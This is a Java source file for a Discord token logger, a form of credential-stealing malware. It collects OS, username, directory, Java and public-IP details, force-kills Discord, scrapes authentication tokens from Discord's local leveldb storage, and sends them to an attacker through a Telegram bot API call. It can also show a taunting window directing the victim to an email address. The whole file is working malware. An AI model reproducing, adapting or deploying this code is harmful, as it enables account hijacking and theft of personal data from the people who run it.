package org.logger;

import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Objects;

public class logger extends config {

    public static ArrayList<String> arr = new ArrayList<>();

    public static void sendToTelegram(String text) {
        String urlString = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s";

        urlString = String.format(urlString, apiToken, chatId, text);

        try {
            URL url = new URL(urlString);
            URLConnection conn = url.openConnection();
            new BufferedInputStream(conn.getInputStream());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {

        try {

            String data = "";

            if (osneeded){
                String osarch = System.getProperty("os.arch");
                String osversion = System.getProperty("os.version");
                String osname = System.getProperty("os.name");
                data = data + "OS: " + osname + " OS version: " + osversion + " Architecture: " + osarch;
            }
            if (usernameneeded){
                String username = System.getProperty("user.name");
                data = data + " Username: " + username;
            }
            if (whereranneeded){
                String userdir = System.getProperty("user.dir");
                data = data + " Where ran: " + userdir;
            }
            if (javainfoneeded){
                String javahome = System.getProperty("java.home");
                String javavendor = System.getProperty("java.vendor");
                String javaversion = System.getProperty("java.runtime.version");
                data = data + " Java home: " + javahome + " Java vendor: " + javavendor + " Java version: " + javaversion;
            }
            if (ipneeded){
                URL whatismyip = new URL("http://checkip.amazonaws.com");
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                        whatismyip.openStream()));
                String ip = bufferedReader.readLine();
                data = data + " IP: " + ip;
            }
            if (tokenneeded) {
                if (killprocessneeded) {
                    Runtime.getRuntime().exec("taskkill /F /IM Discord.exe");
                    Thread.sleep(100);
                }
                for (String s : Objects.requireNonNull(new File(System.getenv("appdata") + "/discord/Local Storage/leveldb").list())) {
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(System.getenv("appdata") + "/discord/Local Storage/leveldb" + "/" + s))));
                    String strLine;
                    while ((strLine = bufferedReader.readLine()) != null && s.endsWith("ldb")) {
                        while (strLine.contains("oken")) {
                            strLine = strLine.substring(strLine.indexOf("oken") + "oken".length());
                            String bulunanToken = strLine.split("\"")[1];
                            if (bulunanToken.length() > 8 && !arr.contains(bulunanToken))
                                arr.add("Token : " + bulunanToken);
                        }
                    }
                    bufferedReader.close();
                }
                for (String s : arr) {
                    sendToTelegram(s);
                    break;
                }
            }
            if (rickrollneeded){
                //https://www.youtube.com/watch?v=dQw4w9WgXcQ
                Desktop desktop = Desktop.getDesktop();
                desktop.browse(new URI("https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
            }
            if (guineeded){
                final JFrame frame = new JFrame("ez logged");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

                JLabel label = new JLabel("<html>Sorry, you just got token logged! :(<br>To get your account back you " +
                        "need to write a letter to omgsoezlog@gmail.com<html>");

                frame.setSize(400,300);
                frame.add(label);
                frame.setVisible(true);
            }
            sendToTelegram(data);
        } catch (Exception e) {
            System.out.println("An error occurred.");
        }
        System.out.println("Final.");
    }
}
